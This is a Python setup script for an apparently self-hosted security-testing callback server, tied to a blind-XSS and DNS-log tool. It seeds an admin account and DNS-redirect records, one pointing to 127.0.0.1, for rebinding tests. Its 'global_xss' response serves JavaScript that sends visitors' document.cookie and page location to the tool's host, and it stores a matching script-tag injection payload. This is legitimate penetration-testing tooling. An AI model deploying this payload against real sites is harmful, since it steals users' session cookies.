# !/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

import json
from sqlalchemy.sql import text
from sqlalchemy import create_engine
from lib.core.g import conf
from lib.core.g import mysql
from lib.core.g import engine
from lib.core.g import engine_session
from lib.core.model import Base
from lib.core.model import User
from lib.core.model import ResponseSetting
from lib.core.model import DNSSetting
from lib.core.enums import UserRole
from lib.core.enums import UserStatus
from lib.util.util import get_time
from lib.util.util import random_string
from werkzeug.security import generate_password_hash

def create_table():
    """
    创建数据库、表结构
    :return:
    """
    # 创建数据库
    sqlalchemy_database_url_without_db = mysql.get_sqlalchemy_database_url_without_db()
    temp_engine = create_engine(sqlalchemy_database_url_without_db)
    with temp_engine.begin() as session:
        session.execute(text(f"CREATE DATABASE IF NOT EXISTS `{mysql.dbname}` CHARACTER SET {mysql.charset} COLLATE {mysql.collate};"))

    # 初始化表结构
    Base.metadata.drop_all(engine)
    Base.metadata.create_all(engine)



def init_user():
    user_list = [
        {"email": 'admin@celestion.com', "description": u"administrator", "username": "admin",
         "failed_time": None, "role": UserRole.ADMIN,
         "status": UserStatus.OK, "login_failed": 0, "created_time": get_time(), "login_time": None,
         "mark": u""},
    ]
    with engine_session.begin() as session:
        for user in user_list:
            email = user['email']
            username = user['username']
            description = user['description']
            password = generate_password_hash(conf.manager.default_password)
            status = user['status']
            api_key = random_string(32)
            login_failed = user['login_failed']
            created_time = user['created_time']
            failed_time = user['failed_time']
            login_time = user['login_time']
            mark = user['mark']
            role = user['role']
            update_time = get_time()
            user = User(email=email, username=username, password=password, status=status,
                        login_failed=login_failed, created_time=created_time, login_time=login_time,
                        description=description, role=role, api_key=api_key,
                        failed_time=failed_time, mark=mark, update_time=update_time)

            session.add(user)
        session.commit()

def init_response_setting():
    response_setting_list = [
        {"name": 'global_xss', "path": "", "response_reason": "OK",
         "response_status_code": 200, "response_headers": json.dumps({"ETag": 'W/"7-ZRvuH4DW9Kitwsjlj5Mh0bAOkR0"',"Server": "XXX"}),
         "response_content_type": "text/javascript;charset=UTF-8", "response_content": b"(new Image()).src = 'http://web." + bytes(conf.dnslog.dns_domain, 'utf-8') + b"/x?data='+document.cookie+'&location='+document.location;", "mark": f"<sCRiPt/SrC=//web.{conf.dnslog.dns_domain}/>"},
        {"name": 'xss_response', "path": "/x", "response_reason": "OK",
         "response_status_code": 200, "response_headers": json.dumps({"ETag": 'W/"7-ZRvuH4DW9Kitwsjlj5Mh0bAOkR0"', "Server": "XXX"}),
         "response_content_type": None, "response_content": b"You are a good boy!", "mark": u""},
    ]
    with engine_session.begin() as session:
        for response_setting in response_setting_list:
            name = response_setting['name']
            path = response_setting['path']
            response_reason = response_setting['response_reason']
            response_status_code = response_setting['response_status_code']
            response_headers = response_setting['response_headers']
            response_content_type = response_setting['response_content_type']
            response_content = response_setting['response_content']
            mark = response_setting['mark']
            update_time = get_time()
            response_setting = ResponseSetting(name=name, path=path, response_reason=response_reason, response_status_code=response_status_code,
                                               response_headers=response_headers, update_time=update_time, mark=mark,
                                               response_content_type=response_content_type,response_content=response_content)

            session.add(response_setting)
        session.commit()

def init_dns_setting():
    dns_setting_list = [
        {"name": 'dnsredirect', "domain": f"dnsredirect.{conf.dnslog.dns_domain}", "value1": "93.184.216.34", "value2": "127.0.0.1",
         "dns_domain": conf.dnslog.dns_domain, "mark": f"DNS redirect test", "dns_redirect": True},
        {"name": 'localhost', "domain": f"localhost.{conf.dnslog.dns_domain}", "value1": "127.0.0.1", "value2": "",
         "dns_domain": conf.dnslog.dns_domain, "mark": f"DNS redirect test", "dns_redirect": False},
    ]
    with engine_session.begin() as session:
        for dns_setting in dns_setting_list:
            name = dns_setting['name']
            domain = dns_setting['domain']
            value1 = dns_setting['value1']
            value2 = dns_setting['value2']
            dns_redirect = dns_setting['dns_redirect']
            dns_domain = dns_setting['dns_domain']
            mark = dns_setting['mark']
            update_time = get_time()
            dns_setting = DNSSetting(name=name, domain=domain, value1=value1, dns_domain=dns_domain, dns_redirect=dns_redirect,
                                     value2=value2, update_time=update_time, mark=mark)
            session.add(dns_setting)
        session.commit()

def run():
    create_table()
    init_user()
    init_response_setting()
    init_dns_setting()


if __name__ == '__main__':
    run()


